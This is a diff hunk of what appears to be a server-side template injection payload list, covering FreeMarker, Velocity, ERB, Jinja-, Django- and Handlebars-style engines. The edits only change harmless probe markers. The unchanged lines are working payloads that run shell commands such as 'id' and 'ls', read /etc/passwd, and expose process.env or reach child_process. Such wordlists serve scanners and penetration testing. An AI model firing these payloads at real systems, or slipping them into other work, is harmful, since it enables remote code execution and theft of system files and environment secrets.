@@ -8,22 +8,22 @@
 {{ constant('PHP_OS') }}
 {{ system('id') }}
 {% for i in [1,2,3] %}{{ i }}{% endfor %}
-${7*7}
+${7*7}aaaaa
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
 #set($x=new java.lang.ProcessBuilder('id').start())$x.waitFor()
 #set($rt=$x.getInputStream())#foreach($c in $rt.readAllBytes())${c}#end
-<%= 7*7 %>
+<%= 7*7 %>aaaaa
 <%= `id` %>
 <%= File.read('/etc/passwd') %>
 <% @x = `ls /usr/bin` %><%= @x %>
-{% with x=7|add:7 %}{{ x }}{% endwith %}
+{% with x=7|add:7 %}{{ x }}{% endwith %}aaaaa
 {% with foo=__import__('os').popen('id') %}{{ foo.read }}{% endwith %}
 {% with foo=__import__('subprocess').check_output('ls', shell=True) %}{{ foo }}{% endwith %}
 {{#with "_.constructor.prototype"}}{{#with "alert"}}{{this}}("1"){{/with}}{{/with}}
 {{this.constructor.constructor("return process.env")()}}
 {{#with "global.process.mainModule.require('child_process').exec"}}{{this}}("id", (e,o,r)=>o)}}{{/with}}
 {{7/0}}
-{{"test".upper()}}
+{{"testjeetuka".upper()}}
 ${7/0}
 <%= 7/0 %>
